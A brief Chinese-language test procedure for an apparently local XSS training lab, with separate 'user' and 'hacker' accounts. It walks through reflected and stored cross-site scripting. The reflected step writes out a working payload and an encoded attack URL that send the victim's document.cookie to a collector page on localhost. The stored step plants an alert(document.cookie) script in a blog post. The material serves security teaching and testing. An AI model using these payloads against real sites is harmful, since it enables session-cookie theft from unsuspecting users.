# 测试流程

##　准备

- user:user
- hacker:hacker

## XSS（2017/A7）

### 反射型（Reflected）

- hacker 用户填写 `"/> <script>window.open("http://127.0.0.1:81/xss_hacker.php?cookie="+document.cookie);</script><!--` 得到攻击 url `http://127.0.0.1:82/xss_reflected.php?address1=%22%2F%3E+%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A81%2Fxss_hacker.php%3Fcookie%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E%3C%21--`
- user 点击攻击 url


### 存储型（Persistent）

- hacker 用户写博客，存入 `<script>alert(document.cookie);</script>`
- user 用户看博客，选择 hacker 用户
